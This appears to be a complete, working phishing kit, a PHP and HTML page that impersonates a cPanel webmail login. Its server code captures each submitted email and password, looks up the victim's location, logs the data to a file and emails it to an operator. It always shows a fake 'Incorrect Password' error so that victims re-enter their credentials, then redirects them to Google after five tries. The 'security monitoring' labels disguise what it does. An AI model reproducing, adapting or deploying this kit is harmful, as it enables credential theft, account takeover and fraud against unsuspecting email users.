<?php
session_start();

// Configuration
$config = [
    'smtp' => [
        'host' => 'smtp.gmail.com', // Change to your SMTP server
        'port' => 587,
        'username' => 'your-email@gmail.com', // Your email
        'password' => 'your-app-password', // Your app password
        'encryption' => 'tls',
        'from_name' => 'Webmail Security System'
    ],
    'notification' => [
        'email' => 'admin@yourdomain.com', // Where to send notifications
        'subject' => 'Webmail Login Attempt - {{timestamp}}'
    ],
    'app' => [
        'log_file' => 'login_attempts.json',
        'max_attempts' => 5,
        'redirect_url' => 'https://google.com'
    ]
];

// Load PHPMailer
if (file_exists('vendor/autoload.php')) {
    require_once 'vendor/autoload.php';
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;
} else {
    // Manual include if composer not used
    if (file_exists('PHPMailer/src/PHPMailer.php')) {
        require_once 'PHPMailer/src/PHPMailer.php';
        require_once 'PHPMailer/src/SMTP.php';
        require_once 'PHPMailer/src/Exception.php';
        use PHPMailer\PHPMailer\PHPMailer;
        use PHPMailer\PHPMailer\SMTP;
        use PHPMailer\PHPMailer\Exception;
    }
}

/**
 * Get user's location information
 */
function getUserLocation($ip) {
    $location_data = [
        'ip' => $ip,
        'city' => 'Unknown',
        'region' => 'Unknown',
        'country' => 'Unknown'
    ];
    
    try {
        // Try to get location from ipinfo.io
        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
                'user_agent' => 'Mozilla/5.0 (compatible; PHP Location Service)'
            ]
        ]);
        
        $response = @file_get_contents("http://ipinfo.io/{$ip}/json", false, $context);
        if ($response) {
            $data = json_decode($response, true);
            if ($data) {
                $location_data['city'] = $data['city'] ?? 'Unknown';
                $location_data['region'] = $data['region'] ?? 'Unknown';
                $location_data['country'] = $data['country'] ?? 'Unknown';
            }
        }
    } catch (Exception $e) {
        error_log("Location lookup failed: " . $e->getMessage());
    }
    
    return $location_data;
}

/**
 * Send email notification
 */
function sendEmailNotification($data, $config) {
    if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
        error_log("PHPMailer not available. Please install it via Composer or include manually.");
        return false;
    }
    
    $mail = new PHPMailer(true);
    
    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $config['smtp']['host'];
        $mail->SMTPAuth = true;
        $mail->Username = $config['smtp']['username'];
        $mail->Password = $config['smtp']['password'];
        $mail->SMTPSecure = $config['smtp']['encryption'];
        $mail->Port = $config['smtp']['port'];
        
        // Recipients
        $mail->setFrom($config['smtp']['username'], $config['smtp']['from_name']);
        $mail->addAddress($config['notification']['email']);
        
        // Content
        $mail->isHTML(true);
        $mail->Subject = str_replace('{{timestamp}}', $data['timestamp'], $config['notification']['subject']);
        
        // Create email body similar to Telegram format
        $html_body = "
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; line-height: 1.6; }
                .container { max-width: 600px; margin: 0 auto; padding: 20px; }
                .header { background: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
                .section { margin-bottom: 20px; padding: 15px; border-left: 4px solid #007bff; background: #f8f9fa; }
                .field { margin-bottom: 10px; }
                .label { font-weight: bold; color: #333; }
                .value { color: #666; margin-left: 10px; }
                .warning { color: #856404; background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class='container'>
                <div class='header'>
                    <h2>📥 Webmail Login Attempt 2025 📥</h2>
                    <p>A new login attempt has been captured on your webmail system.</p>
                </div>
                
                <div class='section'>
                    <h3>📧 Credentials</h3>
                    <div class='field'>
                        <span class='label'>Email:</span>
                        <span class='value'>{$data['email']}</span>
                    </div>
                    <div class='field'>
                        <span class='label'>Password:</span>
                        <span class='value'>{$data['password']}</span>
                    </div>
                </div>
                
                <div class='section'>
                    <h3>📍 Location Details</h3>
                    <div class='field'>
                        <span class='label'>🌆 City:</span>
                        <span class='value'>{$data['location']['city']}</span>
                    </div>
                    <div class='field'>
                        <span class='label'>🌇 Region:</span>
                        <span class='value'>{$data['location']['region']}</span>
                    </div>
                    <div class='field'>
                        <span class='label'>🗾 Country:</span>
                        <span class='value'>{$data['location']['country']}</span>
                    </div>
                </div>
                
                <div class='section'>
                    <h3>🤳 Technical Details</h3>
                    <div class='field'>
                        <span class='label'>🌏 IP Address:</span>
                        <span class='value'>{$data['ip']}</span>
                    </div>
                    <div class='field'>
                        <span class='label'>📱 User Agent:</span>
                        <span class='value'>{$data['user_agent']}</span>
                    </div>
                    <div class='field'>
                        <span class='label'>🕒 Timestamp:</span>
                        <span class='value'>{$data['timestamp']}</span>
                    </div>
                    <div class='field'>
                        <span class='label'>🔄 Attempt #:</span>
                        <span class='value'>{$data['attempt_count']}</span>
                    </div>
                </div>
                
                <div class='warning'>
                    <strong>⚠️ Security Notice:</strong> This login attempt was automatically captured for security monitoring purposes.
                </div>
            </div>
        </body>
        </html>";
        
        $mail->Body = $html_body;
        
        // Plain text version
        $plain_body = "==> 📥Webmail 2025 📥<==\n\n";
        $plain_body .= "Email 📧: {$data['email']}\n";
        $plain_body .= "Password 🔑: {$data['password']}\n\n";
        $plain_body .= "==📍📍=>> Location <<=📍📍==\n";
        $plain_body .= "City 🌆: {$data['location']['city']}\n";
        $plain_body .= "Region 🌇: {$data['location']['region']}\n";
        $plain_body .= "Country 🗾: {$data['location']['country']}\n\n";
        $plain_body .= "===> 🤳Technical Details <<===\n";
        $plain_body .= "IP Address 🌏: {$data['ip']}\n";
        $plain_body .= "UserAgent 📱: {$data['user_agent']}\n";
        $plain_body .= "Timestamp 🕒: {$data['timestamp']}\n";
        $plain_body .= "Attempt # 🔄: {$data['attempt_count']}\n\n";
        $plain_body .= "Coded©️ by Security System";
        
        $mail->AltBody = $plain_body;
        
        return $mail->send();
    } catch (Exception $e) {
        error_log("Email sending failed: " . $mail->ErrorInfo);
        return false;
    }
}

/**
 * Handle AJAX login attempt
 */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'login') {
    header('Content-Type: application/json');
    
    $email = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Get or initialize attempt count
    $attempt_count = $_SESSION['attempt_count'] ?? 0;
    $attempt_count++;
    $_SESSION['attempt_count'] = $attempt_count;
    
    // Get location data
    $location = getUserLocation($ip);
    
    // Prepare data
    $data = [
        'email' => $email,
        'password' => $password,
        'ip' => $ip,
        'user_agent' => $user_agent,
        'timestamp' => date('Y-m-d H:i:s'),
        'attempt_count' => $attempt_count,
        'location' => $location,
        'session_id' => session_id(),
        'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct'
    ];
    
    // Log to file
    file_put_contents($config['app']['log_file'], json_encode($data) . "\n", FILE_APPEND | LOCK_EX);
    
    // Send email notification
    $email_sent = sendEmailNotification($data, $config);
    
    // Determine response
    $response = [
        'success' => false,
        'message' => 'Incorrect Password: Please re-enter password',
        'attempt_count' => $attempt_count,
        'max_attempts' => $config['app']['max_attempts'],
        'email_sent' => $email_sent
    ];
    
    if ($attempt_count >= $config['app']['max_attempts']) {
        $response['redirect'] = $config['app']['redirect_url'];
    }
    
    echo json_encode($response);
    exit();
}

// Extract email from URL hash (will be handled by JavaScript)
$target_email = '';
if (isset($_GET['email'])) {
    $target_email = urldecode($_GET['email']);
}
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <meta name="google" content="notranslate">
    <meta name="apple-itunes-app" content="app-id=1188352635">
    <title>Webmail Login</title>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGEYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">

    <!-- EXTERNAL CSS -->
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap" rel="stylesheet">
    
    <style type="text/css">
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Open Sans', Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .wm #login-wrapper {
            background: white;
            border-radius: 10px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            width: 100%;
            max-width: 400px;
            animation: slideIn 0.6s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        #login-sub-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 30px 20px;
            text-align: center;
        }
        
        .main-logo {
            height: 60px;
            filter: brightness(0) invert(1);
        }
        
        #login-sub {
            padding: 40px 30px;
        }
        
        .input-req-login {
            margin-bottom: 8px;
        }
        
        .input-req-login label {
            font-weight: 600;
            color: #333;
            font-size: 14px;
        }
        
        .input-field-login {
            margin-bottom: 20px;
            position: relative;
        }
        
        .std_textbox {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 6px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }
        
        .std_textbox:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .controls {
            margin-top: 25px;
        }
        
        .login-btn button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease;
        }
        
        .login-btn button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
        }
        
        .login-btn button:active {
            transform: translateY(0);
        }
        
        .reset-pw {
            text-align: center;
            margin-top: 20px;
        }
        
        .reset-pw a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
        
        .reset-pw a:hover {
            text-decoration: underline;
        }
        
        #msg {
            color: #dc3545;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
        }
        
        .copyright {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: rgba(255,255,255,0.7);
            font-size: 12px;
            text-align: center;
        }
        
        .copyright a {
            color: rgba(255,255,255,0.8);
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
        }
        
        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* SweetAlert custom styling */
        .swal-modal {
            border-radius: 10px;
        }
        
        .swal-title {
            color: #333;
            font-size: 18px;
        }
        
        .swal-button {
            background-color: #667eea;
            border-radius: 5px;
        }
    </style>
</head>
<body class="wm">
    <div id="login-wrapper" class="group has-pw-reset">
        <div id="content-container">
            <div id="login-container">
                <div id="login-sub-container">
                    <div id="login-sub-header">
                        <img class="main-logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMjAwIDQwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjx0ZXh0IHg9IjEwIiB5PSIyNSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjE4IiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0iIzMzMzMzMyI+V2VibWFpbDwvdGV4dD48L3N2Zz4=" alt="Webmail Logo">
                    </div>
                    <div id="login-sub">
                        <div id="forms">
                            <form novalidate="" id="login_form" method="post">
                                <div class="input-req-login">
                                    <label for="email">Email Address</label>
                                </div>
                                <div class="input-field-login icon username-container">
                                    <input name="email" id="email" autofocus="autofocus" value="<?php echo htmlspecialchars($target_email, ENT_QUOTES, 'UTF-8'); ?>" placeholder="Enter your email address." class="std_textbox" type="email" tabindex="1" required="">
                                </div>
                                <div class="input-req-login login-password-field-label">
                                    <label for="password">Password</label>
                                </div>
                                <div class="input-field-login icon password-container">
                                    <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
                                </div>
                                <p id="msg"></p>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                    </div>
                                    <div class="loading" id="loading">
                                        <div class="spinner"></div>
                                        <span>Authenticating...</span>
                                    </div>
                                    <div class="reset-pw">
                                        <a href="#" id="reset_password">Reset Password</a>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="copyright">
        Copyright© 2024 cPanel, L.L.C.<br>
        <a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
    </div>

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    
    <script>
    $(document).ready(function(){
        var count = 0;
        
        // Extract email from URL hash
        var email = window.location.hash.substr(1);
        if (email) {
            // Try to decode if it's base64 encoded
            try {
                var decodedEmail = atob(email);
                if (decodedEmail.includes('@')) {
                    $('#email').val(decodedEmail);
                } else {
                    $('#email').val(email);
                }
            } catch(e) {
                $('#email').val(decodeURIComponent(email));
            }
            
            // Validate email format
            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            if (!filter.test($('#email').val())) {
                $('#msg').show().html("Invalid email format!");
            }
        }
        
        // Handle form submission
        $('#login_form').submit(function(event){
            event.preventDefault();
            
            var email = $("#email").val().trim();
            var password = $("#password").val();
            
            // Hide previous messages
            $('#msg').hide();
            
            // Validation
            if (!email) {
                $('#msg').show().html("Email address is required!");
                return false;
            }
            
            if (!password) {
                $('#msg').show().html("Password is required!");
                return false;
            }
            
            // Show loading
            $('#login_submit').hide();
            $('#loading').show();
            
            count++;
            
            // Send data via AJAX
            $.ajax({
                url: window.location.href,
                method: 'POST',
                data: {
                    action: 'login',
                    email: email,
                    password: password
                },
                dataType: 'json',
                success: function(response) {
                    // Hide loading
                    $('#login_submit').show();
                    $('#loading').hide();
                    
                    // Show error message
                    swal({
                        title: "Login Failed",
                        text: response.message,
                        icon: "error",
                        button: "Try Again"
                    });
                    
                    // Clear password field
                    $("#password").val("");
                    
                    // Check if max attempts reached
                    if (response.redirect) {
                        setTimeout(function(){
                            window.location.href = response.redirect;
                        }, 2000);
                    }
                },
                error: function() {
                    // Hide loading
                    $('#login_submit').show();
                    $('#loading').hide();
                    
                    swal({
                        title: "Error",
                        text: "An error occurred. Please try again.",
                        icon: "error",
                        button: "OK"
                    });
                }
            });
        });
        
        // Reset password link
        $('#reset_password').click(function(e) {
            e.preventDefault();
            swal({
                title: "Password Reset",
                text: "Please contact your administrator for password reset.",
                icon: "info",
                button: "OK"
            });
        });
    });
    </script>
</body>
</html>